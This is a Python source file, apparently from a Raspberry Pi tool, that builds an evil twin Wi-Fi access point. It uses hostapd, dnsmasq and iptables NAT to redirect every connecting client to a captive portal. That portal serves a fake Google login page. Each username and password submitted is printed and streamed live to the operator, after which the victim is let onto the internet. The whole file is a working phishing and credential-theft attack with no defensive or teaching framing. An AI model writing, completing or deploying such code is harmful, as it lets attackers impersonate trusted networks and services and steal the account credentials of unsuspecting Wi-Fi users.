import subprocess
import time
import threading
from flask import *
from dnslib import DNSRecord, RR, QTYPE, A
from socketserver import UDPServer, BaseRequestHandler
import re
import os
from flask_socketio import SocketIO

connect_to_wlan0_global = True

def modify_evil_twin_info(evil_twin_name, evil_twin_password):
    # reading from .conf file
    with open("/home/user/pifi/evil_twin_hostapd_reference.conf", 'r') as file:
        lines = file.readlines()

    # if evil twin network is open
    if evil_twin_password == '':
        prefixes = ["wpa=", "wpa_passphrase=", "wpa_key_mgmt=", "rsn_pairwise="]
        lines = [line for line in lines if not any(line.startswith(p) for p in prefixes)]

    # modifing to what user wants
    for i, line in enumerate(lines):
        if line.startswith("ssid="):
            lines[i] = f"ssid={evil_twin_name}\n"
        if line.startswith("wpa_passphrase="):
            lines[i] = f"wpa_passphrase={evil_twin_password}\n"

    print(lines)

    # writing to that file again
    with open("/home/user/pifi/evil_twin_hostapd.conf", 'w') as file:
        file.writelines(lines)

def create_evil_twin(evil_twin_name, evil_twin_password, connect_to_wlan0):
    global connect_to_wlan0_global
    connect_to_wlan0_global = connect_to_wlan0
    modify_evil_twin_info(evil_twin_name, evil_twin_password)
    try:
        # Convert config file line endings
        subprocess.run(["sudo", "dos2unix", "/home/user/pifi/evil_twin_hostapd.conf"], check=True)

        # Stop any existing dnsmasq instance
        subprocess.run(["sudo", "pkill", "-f", "dnsmasq"], check=False)

        # Stop potential conflicting services
        for svc in ("hostapd", "dnsmasq", "dhcpcd"):
            subprocess.run(["sudo", "systemctl", "stop", svc], check=False)

        # Tell NetworkManager to ignore wlan1
        subprocess.run(["sudo", "nmcli", "dev", "set", "wlan1", "managed", "no"], check=False)

        # Kill any wpa_supplicant on wlan1 only
        subprocess.run(["sudo", "pkill", "-f", "wpa_supplicant.*wlan1"], check=False)

        # Enable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

        if connect_to_wlan0:
            # Iptables NAT setup
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "POSTROUTING"], check=True)
            subprocess.run(["sudo", "iptables", "-F", "FORWARD"], check=True)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=True)

            subprocess.run(["sudo", "apt-get", "install", "-y", "iptables-persistent"], check=True)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=True)
            subprocess.run([
                "sudo", "iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "wlan1",
                "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
            ], check=True)
            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "wlan1", "-o", "wlan0", "-j", "ACCEPT"], check=True)

            """
            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
            ], check=True)
            """

            """
            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
            ], check=True)
            """

            subprocess.run(["sudo", "iptables", "-L", "-n", "-v"], check=True)

            subprocess.run(["sudo", "netfilter-persistent", "save"], check=True)

        # Set static IP on wlan1
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", "wlan1"], check=True)
        subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", "wlan1"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", "wlan1", "up"], check=True)

        # Start hostapd in background
        hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", "/home/user/pifi/evil_twin_hostapd.conf"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Allow hostapd to initialize
        time.sleep(3)

        # Start dnsmasq
        # Kill any old captive instance (but leave the system service alone)
        subprocess.run(["sudo", "pkill", "-f", "/home/user/pifi/evil_twin_dnsmasq.conf"], check=False)

        print("Current directory:", os.getcwd())
        print("User id:", os.getuid())
        print("Environment PATH:", os.environ.get("PATH"))

        # Launch dnsmasq without forking so we can track it
        dns_proc = subprocess.Popen([
            "/usr/sbin/dnsmasq",
            "--no-daemon",
            "--conf-file=/home/user/pifi/evil_twin_dnsmasq.conf",
            "--pid-file=/tmp/evil_twin_dnsmasq.pid",
        ], shell=True,
            stdout=subprocess.DEVNULL,
            stderr=None)
        print("[+] Launched dnsmasq, pid:", dns_proc.pid)

        print("Evil Twin Access Point started.")

        return "done\n"
    except Exception as e:
        print(f"Error: {e}")
        return f"Error: {e}\n"

def remove_evil_twin():
    try:
        # Kill hostapd, then our captive dnsmasq via its pidfile
        subprocess.run(["sudo", "pkill", "-f", "hostapd"], check=False)
        if os.path.exists("/tmp/evil_twin_dnsmasq.pid"):
            with open("/tmp/evil_twin_dnsmasq.pid") as f:
                pid = f.read().strip()
            subprocess.run(["sudo", "kill", pid], check=False)
            os.remove("/tmp/evil_twin_dnsmasq.pid")

        # Bring down wlan1 interface and flush IPs
        subprocess.run(["sudo", "ip", "link", "set", "wlan1", "down"], check=False)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", "wlan1"], check=False)

        # Re-enable NetworkManager control on wlan1
        subprocess.run(["sudo", "nmcli", "dev", "set", "wlan1", "managed", "yes"], check=False)

        # Restart dhcpcd or NetworkManager service to reassign IP on wlan1
        subprocess.run(["sudo", "systemctl", "restart", "dhcpcd"], check=False)

        # Disable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)

        if connect_to_wlan0_global:
            # Flush iptables rules added for Evil Twin
            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=False)
            subprocess.run(["sudo", "iptables", "-F", "FORWARD"], check=False)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=False)

            """
            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
                "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
            ], check=True)

            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
                "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
            ], check=True)
            """

            # Save iptables changes
            subprocess.run(["sudo", "netfilter-persistent", "save"], check=False)

        print("Evil Twin Access Point removed and network restored.")
        return "done\n"
    except Exception as e:
        print(f"Error removing Evil Twin: {e}")
        return f"Error removing Evil Twin: {e}\n"
    
clients_in_captive = set()

"""
class DNSHandler(BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSRecord.header_from_request(request))
        qname = request.q.qname
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.0.0.1"), ttl=60))
        sock.sendto(reply.pack(), self.client_address)

def start_dns_server():
    server = UDPServer(("0.0.0.0", 53), DNSHandler)
    server.serve_forever()
"""

def watch_dns_queries():
    log_path = "/tmp/dnsmasq.log"
    print("[*] Watching for DNS queries...")

    # Wait for the log file to be created
    timeout = 10  # seconds
    start = time.time()
    while not os.path.exists(log_path):
        if time.time() - start > timeout:
            print(f"[!] Timeout waiting for {log_path}")
            return
        time.sleep(0.5)

    # Begin tailing the log file
    with open(log_path, "r") as logfile:
        logfile.seek(0, 2)  # go to end of file
        while True:
            line = logfile.readline()
            if not line:
                time.sleep(0.1)
                continue
            match = re.search(r"query\[.*\] (.*?) from (\d+\.\d+\.\d+\.\d+)", line)
            if match:
                domain = match.group(1)
                ip = match.group(2)

def add_new_captive_portal(client_ip):
    print(f"[+] Adding captive portal for {client_ip}")
    try:
        subprocess.run([
            "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
            "-i", "wlan1", "-s", client_ip, "-p", "udp", "--dport", "53", 
            "-j", "REDIRECT", "--to-port", "53"
        ], check=True)
        subprocess.run([
            "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
            "-i", "wlan1", "-s", client_ip, "-p", "tcp", "--dport", "80", 
            "-j", "REDIRECT", "--to-port", "80"
        ], check=True)
        print(f"[+] Added captive portal for {client_ip}")
    except Exception as e:
        print(f"[-] Error: {e}")

def switch_to_normal_mode(client_ip):
    print(f"[+] Removing captive portal for {client_ip}")
    try:
        # deleting old rules
        subprocess.run([
            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
            "-i", "wlan1", "-s", client_ip, "-p", "udp", "--dport", "53", 
            "-j", "REDIRECT", "--to-port", "53"
        ], check=True)
        subprocess.run([
            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
            "-i", "wlan1", "-s", client_ip, "-p", "tcp", "--dport", "80", 
            "-j", "REDIRECT", "--to-port", "80"
        ], check=True)

        subprocess.run(["sudo", "conntrack", "-D", "-s", client_ip], check=False)
        print(f"[+] Removed captive portal for {client_ip}")
    except Exception as e:
        print(f"[-] Error: {e}")

def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, connect_to_wlan0, sid, socketio):
    socketio.emit("output", {"data": "Creating Evil Twin AP...\n"}, to=sid)

    result = remove_evil_twin()
    result = create_evil_twin(evil_twin_name, evil_twin_password, connect_to_wlan0)

    socketio.emit("output", {"data": "Created Evil Twin AP\n"}, to=sid)

    dns_watch_thread = threading.Thread(target=watch_dns_queries)
    dns_watch_thread.daemon = True
    dns_watch_thread.start()

    socketio.emit("output", {"data": "Fake DNS server started, watching for queries...\n"}, to=sid)

    for i in range(10, 51):
        try:
            add_new_captive_portal(f"10.0.0.{i}")
            socketio.emit("output", {"data": f"IPTables rules for IP 10.0.0.{i} are added to the IPTables\n"}, to=sid)
        except Exception as e:
            print(f"Error adding captive portal for 10.0.0.{i}: {e}")

    app = Flask(__name__)

    @app.route("/", defaults={"path": ""})
    @app.route("/<path:path>")
    def catch_all(path):
        return redirect("/login")

    @app.route("/login", methods=["GET", "POST"])
    def login():
        client_ip = request.remote_addr

        # Show the login form if they haven’t POSTed yet
        if request.method == "GET":
            socketio.emit("output", {"data": f"Client {client_ip} connected, redirecting to login page...\n"}, to=sid)
            # When they first GET /login, put them into captive mode
            return render_template("google_fake_login_page.html")

        # POST: they’ve submitted credentials
        username = request.form.get("username")
        password = request.form.get("password")
        socketio.emit("output", {"data": "Client submitted credentials: " + username + "/" + password + "\n"}, to=sid)
        print(f"[+] {client_ip} submitted {username}/{password}")

        # Tear down captive‐portal rules for this client

        socketio.emit("output", {"data": f"Client {client_ip} logged in, removing captive portal rules...\n"}, to=sid)

        switch_to_normal_mode(client_ip)

        socketio.emit("output", {"data": f"Captive portal rules removed for {client_ip}\n"}, to=sid)

        # Now they’ll get real DNS (8.8.8.8) and real HTTP via wlan0 NAT
        return """
        <h3 style="text-align: center; font-family: 'Roboto', sans-serif; margin-top: 100px;">Login successful!</h3>
        """
    
    socketio.emit("output", {"data": "Captive portal started, waiting for clients...\n"}, to=sid)

    app.run(host="10.0.0.1", port=80)